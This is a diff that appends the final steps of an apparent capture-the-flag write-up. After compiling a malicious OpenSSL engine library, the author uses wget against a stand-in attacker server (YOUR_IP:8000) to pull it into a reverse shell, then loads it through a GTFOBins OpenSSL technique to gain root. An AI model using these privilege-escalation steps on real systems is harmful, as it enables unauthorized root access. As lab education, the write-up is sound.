@@ -117,3 +117,25 @@ After we have made this C file, we must compile it using this command.
 gcc -fPIC -o a.o -c engine.c && gcc -shared -o engine.so -Lcrypto a.o
 ```
 
+Once compiled set up another SimpleHTTPServer and grab the engine.so file from your host machine onto the reverse shell.
+```markdown
+$ wget YOUR_IP:8000/engine.so
+--2020-06-17 15:55:53--  http://YOUR_IP:8000/engine.so
+Connecting to YOUR_IP:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16024 (16K) [application/octet-stream]
+Saving to: ‘engine.so’
+
+     0K .......... .....                                      100% 71.8K=0.2s
+
+2020-06-17 15:55:54 (71.8 KB/s) - ‘engine.so’ saved [16024/16024]
+```
+
+We can now open GTFOBins and search for an OpenSSL Library Load.
+![image]({{0xtaylur.github.io}}/assets/gtfo.png)
+
+We can now run this command but switch out "./lib.so" with "./engine.so"
+![image]({{0xtaylur.github.io}}/assets/got_root.png)
+
+We are now root! We should now be able to cat the root flag.
+![image](0xtaylur.github.io}}/assets/root.png)
